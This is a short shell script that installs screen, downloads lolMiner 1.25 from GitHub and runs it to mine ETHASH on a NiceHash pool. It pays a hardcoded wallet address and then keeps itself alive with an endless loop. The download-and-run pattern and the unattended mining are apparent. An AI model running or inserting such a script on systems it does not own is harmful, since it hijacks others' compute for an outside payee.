#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.25/lolMiner_v1.25_Lin64.tar.gz
tar xf lolMiner_v1.25_Lin64.tar.gz
cd 1.25
./lolMiner --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 3Fin88qC7hcmc6vifCjruCeDT4Ce3xGNtp.WORKER3
while [ 1 ]; do
sleep 3
done
sleep 999
